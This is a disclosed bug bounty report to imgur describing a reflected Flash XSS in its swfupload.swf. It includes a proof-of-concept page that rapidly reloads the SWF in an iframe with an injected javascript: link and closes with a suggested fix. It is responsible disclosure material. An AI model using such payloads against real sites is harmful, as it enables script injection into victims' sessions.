# Reflected Flash XSS using swfupload.swf with an epileptic reloading to bypass the button-event

## Report Details
- **Report ID**: 91421
- **URL**: https://hackerone.com/reports/91421
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2015-10-01T02:12:35.523Z
- **Disclosed**: 2016-07-28T10:38:10.790Z

## Reporter
- **Username**: fransrosen
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: imgur

## Vulnerability Information
Hi,
This was a fun one.

So I noticed you're using swfupload.swf which is hosted on the main domain, imgur.com. This swfupload.swf as some settings you can use to modify the button on the upload. You can actually insert HTML into the Flash, but the button event (that you select yourself using another parameter) is taking over the MouseClick-event from the HTML-content you provide.

However, if you're really quick, you can actually catch the even in the HTML anyway. So by making a page that would reload the SWF constantly (from cache that is) you can make a page that looks like this:
```
<iframe src="about:blank" id="x"></iframe>

<script>u='https://imgur.com/include/flash/swfupload.swf?buttonDisabled=&buttonText=%3Ca%20%20href=%22javascript:alert(document.domain)%22%3ECLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME%3C/a%3E&buttonImageURL=/&buttonTextStyle=a{color:%23ff00ff}&buttonAction=-120&buttonCursor=-2';
setInterval(function(){document.getElementById('x').contentWindow.location=u},300)</script>
```

That will reload the content over and over, and if you click the text in the right time, the XSS will trigger.

I think I got an epileptic reaction out of testing this, but it was fun anyway, haha. You should probably move the swfupload.swf to another domain, and just embed it on imgur.com since that will give you the same options as today, but without the possibility to access the SWF directly and inject the parameters on your domain.

PoC-image attached.

Cheers,
Frans

## Attachments
- Screen_Shot_2015-10-01_at_04.06.05.png
